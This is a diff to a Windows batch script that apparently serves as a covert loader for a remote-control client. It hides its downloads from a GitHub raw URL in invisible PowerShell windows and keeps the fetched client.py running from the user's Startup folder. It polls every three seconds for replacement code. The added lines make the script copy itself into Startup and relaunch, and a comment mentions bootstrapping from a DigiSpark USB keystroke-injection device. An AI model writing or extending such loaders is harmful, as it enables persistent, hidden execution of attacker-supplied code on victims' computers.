@@ -1,13 +1,13 @@
 @echo off
 setlocal enabledelayedexpansion
 
-rem Operator template: ensure client.py exists and is running; poll every 3s for updates; replace on change
+rem Operator: ensure client.py exists and is running; poll every 3s for updates; replace on change
 rem Includes:
 rem - Robust python detection (pythonw/python/py -3.11)
 rem - Force-start immediately after first download
 rem - Custom command variables so you can specify exactly how to run client.py
 
-set "url=https://raw.githubusercontent.com/sky9262/abc/refs/heads/main/client.py"
+set "url=https://raw.githubusercontent.com/sky9262/abc/main/client.py"
 set "base=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "target=%base%\client.py"
 set "pidfile=%base%\client.pid"
@@ -27,6 +27,15 @@ rem =====================================================
 
 if not exist "%base%" mkdir "%base%" >nul 2>&1
 
+rem Self-install to Startup if running from elsewhere (supports DigiSpark temp bootstrap)
+set "SELF=%~f0"
+set "OP_PATH=%base%\operator.bat"
+if /I not "%SELF%"=="%OP_PATH%" (
+  copy /y "%SELF%" "%OP_PATH%" >nul 2>&1
+  start "" "%OP_PATH%"
+  exit /b
+)
+
 :mainloop
 rem ========== Loop start ==========
 echo [%date% %time%] Loop start >> "%log%"
@@ -34,7 +43,7 @@ echo [%date% %time%] Loop start >> "%log%"
 rem 1) Ensure client.py exists (download if missing)
 if not exist "%target%" (
   echo [%date% %time%] client.py missing; downloading from %url% >> "%log%"
-  powershell -NoProfile -WindowStyle Hidden -Command "try{Invoke-WebRequest -UseBasicParsing -Uri '%url%' -OutFile '%target%' -ErrorAction Stop}catch{}" >nul 2>&1
+  powershell -NoProfile -WindowStyle Hidden -Command "$u='%url%'; try{ [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u=$u+'?t='+[guid]::NewGuid().ToString('N'); Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile '%target%' -ErrorAction Stop }catch{}" >nul 2>&1
   if exist "%target%" (
     echo [%date% %time%] Downloaded client.py to "%target%" >> "%log%"
     rem Force a start immediately after first download (bypass detection edge-cases)
@@ -69,12 +78,12 @@ if "%RUNNING%"=="1" (
 
 rem 3) Poll for new version and compare against current (update flow)
 set "temp=%TEMP%\client_new_%RANDOM%.py"
-powershell -NoProfile -WindowStyle Hidden -Command "try{Invoke-WebRequest -UseBasicParsing -Uri '%url%' -OutFile '%temp%' -ErrorAction Stop}catch{}" >nul 2>&1
+powershell -NoProfile -WindowStyle Hidden -Command "$u='%url%'; try{ [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u=$u+'?t='+[guid]::NewGuid().ToString('N'); Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile '%temp%' -ErrorAction Stop }catch{}" >nul 2>&1
 
 if exist "%temp%" (
   set "DIFF=0"
   if exist "%target%" (
-    powershell -NoProfile -Command "$h1=(Get-FileHash -Algorithm SHA256 -Path $env:temp).Hash; $h2=(Get-FileHash -Algorithm SHA256 -Path $env:target).Hash; if($h1 -ne $h2){exit 1}else{exit 0}" >nul 2>&1
+    powershell -NoProfile -Command "$h1=(Get-FileHash -Algorithm SHA256 -Path '%temp%').Hash; $h2=(Get-FileHash -Algorithm SHA256 -Path '%target%').Hash; if($h1 -ne $h2){exit 1}else{exit 0}" >nul 2>&1
     if errorlevel 1 set "DIFF=1"
   ) else (
     set "DIFF=1"
